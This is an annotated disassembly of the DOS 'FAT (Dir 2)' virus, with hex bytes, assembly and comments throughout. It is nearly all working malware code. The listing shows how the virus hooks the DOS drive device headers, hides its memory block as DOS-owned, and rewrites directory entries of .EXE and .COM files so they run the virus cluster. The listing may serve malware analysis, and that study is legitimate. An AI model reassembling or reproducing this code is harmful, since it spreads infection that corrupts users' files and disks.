                        ; FAT Virus (Dir 2) Entry Point

Subrutines:

    Offset      Description         Inputs                  Outputs

     023D       Call INT 21         All                     All
     04B1       Call Original
                Strategy &
                Interrupt Routines.


Variables:
    04B2    Word    Device Strategy Entry Point  (Offset)
    04B7    Word    Device Interrupt Entry Point (Offset)
    04E9            Device Header
                            Next_Driver    DD  0044:C340
                            Device_Attrs.  DW  0842    ; 32 Bits Segments
                                                       ; Generic IOCTL Suported
                                                       ; OPEN/CLOSE/RemMedia Sp
                            Device_Strat.  DW  024B
                            Device_Interr. DW  02A2
                            SubUnits_Count DB  7F
                            Unused         DB  0,0,80,0,8A,0C,5C
    04EB    Word    Excecutions Counter
    05FA    Word    First MCB Segment
    05FC    DWord   Real INT 21 Address
0100 BC 00 06                MOV SP,0600                ; SP=0600
0103 FF 06 EB 04             INC W[04EB]                ; [04EB]++
0107 31 C9                   XOR CX,CX                  ; CX=0000
0109 8E D9                   MOV DS,CX                  ; DS=0000
010B C5 06 C1 00             LDS AX,[0C1]               ; DS:AX=Far Address CPM
                                                        ; Entry Point
010F 05 21 00                ADD AX,021                 ; AX+=0021
0112 1E                      PUSH DS                    ; [05FE]=INT 21 Segment
0113 50                      PUSH AX                    ; [05FC]=INT 21 Offset

                    ; They Expect CPM+0021 to be INT 21 Entry
                    ; In DOS 4.01, it points 4 Bytes up in Mem, but
                    ; It's a valid entry point, in DOS 5.00 it
                    ; isn't a valid entry point. It Will Exec
                    ; Function CL, not AL.

0114 B4 30                   MOV AH,030                 ; AH=30
0116 E8 24 01                CALL 023D                  ; INT 21 Get DOS Version
0119 3C 04                   CMP AL,4                   ; Flags = AL-4
011B 19 F6                   SBB SI,SI                  ; SI=(AL<4) ? FFFF :0000
011D C6 06 65 04 FF          MOV B[0465],0FF            ; [0465]=FF
0122 BB 60 00                MOV BX,060                 ; BX=0060
0125 B4 4A                   MOV AH,04A                 ; AH=4A
0127 E8 13 01                CALL 023D                  ; INT 21 Change Blk Size
012A B4 52                   MOV AH,052                 ; AH=52
012C E8 0E 01                CALL 023D                  ; INT 21 ES:BX -> InVars
012F 26 FF 77 FE             ES PUSH W[BX-2]            ; [05FA]=First MCB Seg.
0133 26 C5 1F                ES LDS BX,[BX]             ; DS:BX -> First DPB

0136 8B 40 15                MOV AX,W[BX+SI+015]        ; AX=Device Driver H Seg
0139 3D 70 00                CMP AX,070                 ;
013C 75 10                   JNE 014E                   ; Segment!=DOS Segment?

                    ; if Device Header points to DOS, change it to
                    ; point to viral code.

013E 91                      XCHG AX,CX                 ; CX=0070 | AX=0000
013F C6 40 18 FF             MOV B[BX+SI+018],0FF       ; Clear Disk Access
0143 8B 78 13                MOV DI,W[BX+SI+013]        ; DI=Device Header Offst
0146 C7 40 13 E9 04          MOV W[BX+SI+013],04E9      ; Device H Off = 04E9
014B 8C 48 15                MOV W[BX+SI+015],CS        ; Device Header=CS:04E9
014E C5 58 19                LDS BX,[BX+SI+019]         ; DS:BX->Next DrivePB
0151 83 FB FF                CMP BX,FFFF                ;
0154 75 E0                   JNE 0136                   ; Isn't Last DPB?  Goon

                    ; At this point the Device Header of All
                    ; DPB belonging to DOS is pointing to the
                    ; FAT Code.

0156 E3 75                   JCXZ 01CD                  ; Dosn't have a Device H
                                                        ; End the Execution
                    ; If there isn't any DPB pointing to
                    ; DOS, the virus stops the execution
                    ; 'cos he couldn't hang him self anywhere

0158 1F                      POP DS                     ; DS=First MCB Segment
0159 8C D8                   MOV AX,DS                  ; AX=First MCB Segment
015B 03 06 03 00             ADD AX,W[3]                ; 
015F 40                      INC AX                     ; AX=Next MCB Segment
0160 8C CA                   MOV DX,CS                  ; DX=CS
0162 4A                      DEC DX                     ; DX=FAT's MCB Segment
0163 39 D0                   CMP AX,DX                  ;
0165 75 05                   JNE 016C                   ; AX!=FAT's MCB ? Skeep
0167 83 06 03 00 61          ADD W[3],061               ; Increase Program Before
                                                        ; FAT 61 paras in size
                    ; Here the virus clears it MCB by
                    ; enlarging the previous MCB and setting
                    ; it like an MCB belonging to DOS

016C 8E DA                   MOV DS,DX                  ; DS=Before's Segment
016E C7 06 01 00 08 00       MOV W[1],8                 ; MCB Belongs to DOS
0174 8E D9                   MOV DS,CX                  ; DS=0070 (DHead Seg)
0176 C4 45 06                LES AX,[DI+6]              ; ES:AX -> Device Strategy
0179 2E A3 B2 04             CS MOV W[04B2],AX          ; [04B2]=Strategy Offset
017D 2E 8C 06 B7 04          CS MOV W[04B7],ES          ; [04B7]=Interrupt Offst
0182 FC                      CLD                        ;
0183 BE 01 00                MOV SI,1                   ; SI=0001
0186 4E                      DEC SI                     ;
0187 AD                      LODSW                      ; AX=DS:SI
0188 3D FF 1E                CMP AX,01EFF               ; Search 1EFF in DOS
                                                        ; 1EFF is CALL FAR []
018B 75 F9                   JNE 0186                   ; If not Found Goes On
018D B8 CA 02                MOV AX,02CA                ; AX=02CA
0190 39 44 04                CMP W[SI+4],AX             ;
0193 74 05                   JE 019A
0195 39 44 05                CMP W[SI+5],AX
0198 75 EC                   JNE 0186
019A AD                      LODSW
019B 0E                      PUSH CS
019C 07                      POP ES
019D BF 94 04                MOV DI,0494
01A0 AB                      STOSW
01A1 96                      XCHG AX,SI
01A2 BF F8 05                MOV DI,05F8
01A5 FA                      CLI
01A6 A5                      MOVSW
01A7 A5                      MOVSW
01A8 BA 00 C0                MOV DX,0C000
01AB 8E DA                   MOV DS,DX
01AD 31 F6                   XOR SI,SI
01AF AD                      LODSW
01B0 3D 55 AA                CMP AX,0AA55
01B3 75 23                   JNE 01D8
01B5 98                      CBW
01B6 AC                      LODSB
01B7 B1 09                   MOV CL,9
01B9 D3 E0                   SHL AX,CL
01BB 81 3C C7 06             CMP W[SI],06C7
01BF 75 12                   JNE 01D3
01C1 83 7C 02 4C             CMP W[SI+2],04C
01C5 75 0C                   JNE 01D3
01C7 52                      PUSH DX
01C8 FF 74 04                PUSH W[SI+4]
01CB EB 14                   JMP 01E1
01CD CD 20                   INT 020
01CF 63 3A                   ARPL W[BP+SI],DI
01D1 FF 00                   INC W[BX+SI]
01D3 46                      INC SI
01D4 39 C6                   CMP SI,AX
01D6 72 E3                   JB 01BB
01D8 42                      INC DX
01D9 80 FE F0                CMP DH,0F0
01DC 72 CD                   JB 01AB
01DE 83 EC 04                SUB SP,4
01E1 0E                      PUSH CS
01E2 1F                      POP DS
01E3 8B 1E 2C 00             MOV BX,W[02C]
01E7 8E C3                   MOV ES,BX
01E9 B4 49                   MOV AH,049
01EB E8 4F 00                CALL 023D                  ; INT 21 | Free Mem
01EE 31 C0                   XOR AX,AX
01F0 85 DB                   TEST BX,BX
01F2 74 0C                   JE 0200
01F4 BF 01 00                MOV DI,1
01F7 4F                      DEC DI
01F8 AF                      SCASW
01F9 75 FC                   JNE 01F7
01FB 8D 75 02                LEA SI,[DI+2]
01FE EB 0C                   JMP 020C
0200 8E 06 16 00             MOV ES,W[016]
0204 26 8B 1E 16 00          ES MOV BX,W[016]
0209 4B                      DEC BX
020A 31 F6                   XOR SI,SI
020C 53                      PUSH BX
020D BB F4 04                MOV BX,04F4
0210 8C 4F 04                MOV W[BX+4],CS
0213 8C 4F 08                MOV W[BX+8],CS
0216 8C 4F 0C                MOV W[BX+0C],CS
0219 1F                      POP DS
021A 0E                      PUSH CS
021B 07                      POP ES
021C BF 22 05                MOV DI,0522
021F 57                      PUSH DI
0220 B9 28 00                MOV CX,028
0223 F3 A5                   REP MOVSW
0225 0E                      PUSH CS
0226 1F                      POP DS
0227 B4 3D                   MOV AH,03D
0229 BA CF 01                MOV DX,01CF
022C E8 0E 00                CALL 023D                  ; INT 21 | Open File
022F 5A                      POP DX
0230 B8 00 4B                MOV AX,04B00
0233 E8 07 00                CALL 023D                  ; INT 21 | Exec File
0236 B4 4D                   MOV AH,04D
0238 E8 02 00                CALL 023D                  ; INT 21 | Get Errorlevl
023B B4 4C                   MOV AH,04C
023D 9C                      PUSHF                      ; Push Flags
023E 2E FF 1E FC 05          CS CALL D[05FC]            ; Call Original INT 21
0243 C3                      RET                        ;

0244 B4 03                   MOV AH,3
0246 2E FF 2E F8 05          CS JMP D[05F8]

                        ; External Entry Point. Device Strategy Code

024B 50                      PUSH AX
024C 51                      PUSH CX
024D 52                      PUSH DX
024E 1E                      PUSH DS
024F 56                      PUSH SI
0250 57                      PUSH DI
0251 06                      PUSH ES
0252 1F                      POP DS
0253 8A 47 02                MOV AL,B[BX+2]
0256 3C 04                   CMP AL,4
0258 74 61                   JE 02BB
025A 3C 08                   CMP AL,8
025C 74 45                   JE 02A3
025E 3C 09                   CMP AL,9
0260 74 41                   JE 02A3
0262 E8 4C 02                CALL 04B1                  ; Call Orig Strtg & INT
0265 3C 02                   CMP AL,2
0267 75 33                   JNE 029C
0269 C5 77 12                LDS SI,[BX+012]
026C BF 02 05                MOV DI,0502
026F 26 89 7F 12             ES MOV W[BX+012],DI
0273 26 8C 4F 14             ES MOV W[BX+014],CS
0277 06                      PUSH ES
0278 0E                      PUSH CS
0279 07                      POP ES
027A B9 10 00                MOV CX,010
027D F3 A5                   REP MOVSW
027F 07                      POP ES
0280 0E                      PUSH CS
0281 1F                      POP DS
0282 8A 45 E2                MOV AL,B[DI-01E]
0285 3C 02                   CMP AL,2
0287 14 00                   ADC AL,0
0289 98                      CBW
028A 83 7D E8 00             CMP W[DI-018],0
028E 74 05                   JE 0295
0290 29 45 E8                SUB W[DI-018],AX
0293 EB 07                   JMP 029C
0295 29 45 F5                SUB W[DI-0B],AX
0298 83 5D F7 00             SBB W[DI-9],0
029C 5F                      POP DI
029D 5E                      POP SI
029E 1F                      POP DS
029F 5A                      POP DX
02A0 59                      POP CX
02A1 58                      POP AX

                        ; External Entry Point. Device Interrupt Code

02A2 CB                      RETF
02A3 B9 09 FF                MOV CX,-0F7
02A6 E8 B7 01                CALL 0460
02A9 74 05                   JE 02B0
02AB E8 03 02                CALL 04B1                  ; Call Orig Strtg & INT
02AE EB 10                   JMP 02C0
02B0 E9 28 01                JMP 03DB
02B3 E9 1F 01                JMP 03D5
02B6 83 C4 10                ADD SP,010
02B9 EB E1                   JMP 029C
02BB E8 A2 01                CALL 0460
02BE 74 F3                   JE 02B3
02C0 C6 47 02 04             MOV B[BX+2],4
02C4 FC                      CLD
02C5 8D 77 0E                LEA SI,[BX+0E]
02C8 B9 08 00                MOV CX,8
02CB AD                      LODSW
02CC 50                      PUSH AX
02CD E2 FC                   LOOP 02CB
02CF C7 47 14 01 00          MOV W[BX+014],1
02D4 E8 D4 01                CALL 04AB
02D7 75 DD                   JNE 02B6
02D9 C6 47 02 02             MOV B[BX+2],2
02DD E8 D1 01                CALL 04B1                  ; Call Orig Strtg & INT
02E0 C5 77 12                LDS SI,[BX+012]
02E3 8B 44 06                MOV AX,W[SI+6]
02E6 05 0F 00                ADD AX,0F
02E9 B1 04                   MOV CL,4
02EB D3 E8                   SHR AX,CL
02ED 8B 7C 0B                MOV DI,W[SI+0B]
02F0 01 FF                   ADD DI,DI
02F2 F9                      STC
02F3 11 C7                   ADC DI,AX
02F5 57                      PUSH DI
02F6 99                      CWD
02F7 8B 44 08                MOV AX,W[SI+8]
02FA 85 C0                   TEST AX,AX
02FC 75 06                   JNE 0304
02FE 8B 44 15                MOV AX,W[SI+015]
0301 8B 54 17                MOV DX,W[SI+017]
0304 31 C9                   XOR CX,CX
0306 29 F8                   SUB AX,DI
0308 19 CA                   SBB DX,CX
030A 8A 4C 02                MOV CL,B[SI+2]
030D F7 F1                   DIV CX
030F 80 F9 02                CMP CL,2
0312 1D FF FF                SBB AX,-1
0315 50                      PUSH AX
0316 E8 A8 01                CALL 04C1
0319 26 C6 47 02 04          ES MOV B[BX+2],4
031E 26 89 47 14             ES MOV W[BX+014],AX
0322 E8 86 01                CALL 04AB
0325 26 C5 77 0E             ES LDS SI,[BX+0E]
0329 01 D6                   ADD SI,DX
032B 28 CE                   SUB DH,CL
032D 11 C2                   ADC DX,AX
032F 2E 89 16 3F 04          CS MOV W[043F],DX
0334 80 F9 01                CMP CL,1
0337 74 1B                   JE 0354
0339 8B 04                   MOV AX,W[SI]
033B 21 F8                   AND AX,DI
033D 3D F7 FF                CMP AX,-9
0340 74 0A                   JE 034C
0342 3D F7 0F                CMP AX,0FF7
0345 74 05                   JE 034C
0347 3D 70 FF                CMP AX,-090
034A 75 2A                   JNE 0376
034C 58                      POP AX
034D 48                      DEC AX
034E 50                      PUSH AX
034F E8 6F 01                CALL 04C1
0352 EB D1                   JMP 0325
0354 F7 D7                   NOT DI
0356 21 3C                   AND W[SI],DI
0358 58                      POP AX
0359 50                      PUSH AX
035A 40                      INC AX
035B 50                      PUSH AX
035C BA 0F 00                MOV DX,0F
035F 85 D7                   TEST DI,DX
0361 74 03                   JE 0366
0363 42                      INC DX
0364 F7 E2                   MUL DX
0366 09 04                   OR W[SI],AX
0368 58                      POP AX
0369 E8 55 01                CALL 04C1
036C 26 8B 77 0E             ES MOV SI,W[BX+0E]
0370 01 D6                   ADD SI,DX
0372 8B 04                   MOV AX,W[SI]
0374 21 F8                   AND AX,DI
0376 8B D7                   MOV DX,DI
0378 4A                      DEC DX
0379 21 FA                   AND DX,DI
037B F7 D7                   NOT DI
037D 21 3C                   AND W[SI],DI
037F 09 14                   OR W[SI],DX
0381 39 D0                   CMP AX,DX
0383 58                      POP AX
0384 5F                      POP DI
0385 2E A3 34 04             CS MOV W[0434],AX
0389 74 3F                   JE 03CA
038B 8B 14                   MOV DX,W[SI]
038D 1E                      PUSH DS
038E 56                      PUSH SI
038F E8 F0 00                CALL 0482
0392 5E                      POP SI
0393 1F                      POP DS
0394 75 34                   JNE 03CA
0396 E8 12 01                CALL 04AB
0399 39 14                   CMP W[SI],DX
039B 75 2D                   JNE 03CA
039D 48                      DEC AX
039E 48                      DEC AX
039F F7 E1                   MUL CX
03A1 01 F8                   ADD AX,DI
03A3 83 D2 00                ADC DX,0
03A6 06                      PUSH ES
03A7 1F                      POP DS
03A8 C7 47 12 02 00          MOV W[BX+012],2
03AD 89 47 14                MOV W[BX+014],AX
03B0 85 D2                   TEST DX,DX
03B2 74 0B                   JE 03BF
03B4 C7 47 14 FF FF          MOV W[BX+014],-1
03B9 89 47 1A                MOV W[BX+01A],AX
03BC 89 57 1C                MOV W[BX+01C],DX
03BF 8C 4F 10                MOV W[BX+010],CS
03C2 C7 47 0E 00 01          MOV W[BX+0E],0100
03C7 E8 B8 00                CALL 0482
03CA FD                      STD
03CB 8D 7F 1C                LEA DI,[BX+01C]
03CE B9 08 00                MOV CX,8
03D1 58                      POP AX
03D2 AB                      STOSW
03D3 E2 FC                   LOOP 03D1
03D5 E8 D9 00                CALL 04B1                  ; Call Orig Strtg & INT
03D8 B9 09 00                MOV CX,9
03DB 26 8B 7F 12             ES MOV DI,W[BX+012]
03DF 26 C5 77 0E             ES LDS SI,[BX+0E]
03E3 D3 E7                   SHL DI,CL
03E5 30 C9                   XOR CL,CL
03E7 01 F7                   ADD DI,SI
03E9 30 D2                   XOR DL,DL
03EB 1E                      PUSH DS
03EC 56                      PUSH SI
03ED E8 13 00                CALL 0403
03F0 E3 08                   JCXZ 03FA
03F2 E8 8D 00                CALL 0482
03F5 26 80 67 04 7F          ES AND B[BX+4],07F
03FA 5E                      POP SI
03FB 1F                      POP DS
03FC 42                      INC DX
03FD E8 03 00                CALL 0403
0400 E9 99 FE                JMP 029C
0403 8B 44 08                MOV AX,W[SI+8]
0406 3D 45 58                CMP AX,05845
0409 75 05                   JNE 0410
040B 38 44 0A                CMP B[SI+0A],AL
040E 74 0B                   JE 041B
0410 3D 43 4F                CMP AX,04F43
0413 75 3E                   JNE 0453
0415 80 7C 0A 4D             CMP B[SI+0A],04D
0419 75 38                   JNE 0453
041B F7 44 1E C0 FF          TEST W[SI+01E],-040
0420 75 31                   JNE 0453
0422 F7 44 1D F8 3F          TEST W[SI+01D],03FF8
0427 74 2A                   JE 0453
0429 F6 44 0B 1C             TEST B[SI+0B],01C
042D 75 24                   JNE 0453
042F 84 D2                   TEST DL,DL
0431 75 13                   JNE 0446
0433 B8 43 09                MOV AX,0943                    ; Variable
0436 3B 44 1A                CMP AX,W[SI+01A]
0439 74 18                   JE 0453
043B 87 44 1A                XCHG W[SI+01A],AX
043E 35 EB 03                XOR AX,03EB                        ; Variable
0441 89 44 14                MOV W[SI+014],AX
0444 E2 0D                   LOOP 0453
0446 31 C0                   XOR AX,AX
0448 87 44 14                XCHG W[SI+014],AX
044B 2E 33 06 3F 04          CS XOR AX,W[043F]
0450 89 44 1A                MOV W[SI+01A],AX
0453 2E D1 06 3F 04          CS ROL W[043F],1
0458 83 C6 20                ADD SI,020
045B 39 F7                   CMP DI,SI
045D 75 A4                   JNE 0403
045F C3                      RET

0460 8A 67 01                MOV AH,B[BX+1]
0463 80 FC 00                CMP AH,0                   ; Variable
0466 2E 88 26 65 04          CS MOV B[0465],AH
046B 75 14                   JNE RET
046D FF 77 0E                PUSH W[BX+0E]
0470 C6 47 02 01             MOV B[BX+2],1
0474 E8 3A 00                CALL 04B1                  ; Call Orig Strtg & INT
0477 80 7F 0E 01             CMP B[BX+0E],1
047B 8F 47 0E                POP W[BX+0E]
047E 88 47 02                MOV B[BX+2],AL
0481 C3                      RET
0482 26 80 7F 02 08          ES CMP B[BX+2],8
0487 73 28                   JAE 04B1
0489 26 C6 47 02 04          ES MOV B[BX+2],4
048E BE 70 00                MOV SI,070
0491 8E DE                   MOV DS,SI
0493 BE B4 00                MOV SI,0B4
0496 FF 34                   PUSH W[SI]
0498 FF 74 02                PUSH W[SI+2]
049B C7 04 44 02             MOV W[SI],0244
049F 8C 4C 02                MOV W[SI+2],CS
04A2 E8 0C 00                CALL 04B1                  ; Call Orig Strtg & INT
04A5 8F 44 02                POP W[SI+2]
04A8 8F 04                   POP W[SI]
04AA C3                      RET
04AB 26 C7 47 12 01 00       ES MOV W[BX+012],1

                        ; Subrutine.   Call Original Strategy & Interrupt
                        ;              Routines.

04B1 9A DC 05 70 00          CALL 0070:05DC             ; Call Original Strategy
04B6 9A 34 06 70 00          CALL 0070:0634             ; Call Original Interrup
04BB 26 F6 47 04 80          ES TEST B[BX+4],080
04C0 C3                      RET
04C1 3D F0 0F                CMP AX,0FF0
04C4 73 16                   JAE 04DC
04C6 BE 03 00                MOV SI,3
04C9 2E 31 B4 3D 04          CS XOR W[SI+043D],SI
04CE F7 E6                   MUL SI
04D0 D1 E8                   SHR AX,1
04D2 BF FF 0F                MOV DI,0FFF
04D5 73 0D                   JAE 04E4
04D7 BF F0 FF                MOV DI,-010
04DA EB 08                   JMP 04E4
04DC BE 02 00                MOV SI,2
04DF F7 E6                   MUL SI
04E1 BF FF FF                MOV DI,-1
04E4 BE 00 02                MOV SI,0200
04E7 F7 F6                   DIV SI

                        STRUC Device_Driver_Header
04E9 40 C3 44 00             Next_Driver    DD  0044:C340
04ED 42 08                   Device_Attrs.  DW  0842    ; 32 Bits Segments
                                                        ; Generic IOCTL Suported
                                                        ; OPEN/CLOSE/RemMedia Sp
04EF 4B 02                   Device_Strat.  DW  024B
04F1 A2 02                   Device_Interr. DW  02A2
04F3 7F                      SubUnits_Count DB  7F
04F4 00 00 80 00 8A 0C 5C    Unused         DB  0,0,80,0,8A,0C,5C
                        ENDS    Device_Driver_Header
;        /--/--Variables
04FB 00 8A 0C 6C             ADD B[BP+SI+06C0C],CL
04FF 00 90 90 90             ADD B[BX+SI+09090],DL
